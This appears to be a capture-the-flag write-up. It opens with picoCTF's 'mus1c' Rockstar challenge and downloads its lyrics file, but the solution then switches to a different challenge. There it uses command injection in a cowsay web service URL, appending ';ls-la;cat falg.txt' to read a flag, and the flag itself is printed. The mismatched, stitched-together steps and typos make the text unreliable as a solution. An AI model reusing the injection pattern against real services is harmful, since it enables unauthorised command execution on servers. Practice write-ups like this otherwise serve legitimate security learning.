# Medium Challenge

> Read full challenge at: https://play.picoctf.org/practice/challenge/15?category=5&page=5


**Hint**: Do you think you can master rockstar?

> Note: Put it in the picoCTF{} flag format.

## Solution


**Step** 1: Create a folder "mus1c" and download [song](https://jupiter.challenges.picoctf.org/static/c594d8d915de0129d92b4c41e25a2313/lyrics.txt) in this challenge to this folder by using `mkdir` and `wget`

```sh
mkdir mus1c
```

```sh
wget https://jupiter.challenges.picoctf.org/static/c594d8d915de0129d92b4c41e25a2313/lyrics.txt
```

![Image of step1](image1.png)


**Step 2** : Make a request to the following URL to cowsay your message

Follow the instruction in the website I will copy the URL, the message I will write a random sring like the iamge below 

```
https://caas.mars.picoctf.net/cowsay/jajgagjagjajgal
```

> You can copy and try it on your browser

![Iamge of step 2](image1.png)

**Step 3** : Find the `Flag`

As I mention above, I can use the command on the url bar like using command on terminal, I will use command **ls-la** to lis all file:
```
https://caas.mars.picoctf.net/cowsay/jajgagjagjajgal;ls-la
```

![Image of step 3.1](image2.png)

So, after list all all file I can see the file **falg.txt** so let use command:
```
https://caas.mars.picoctf.net/cowsay/jajgagjagjajgal;ls-la;cat falg.txt
```

![Image of step 3.2](image4.png)


So, the flag is `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
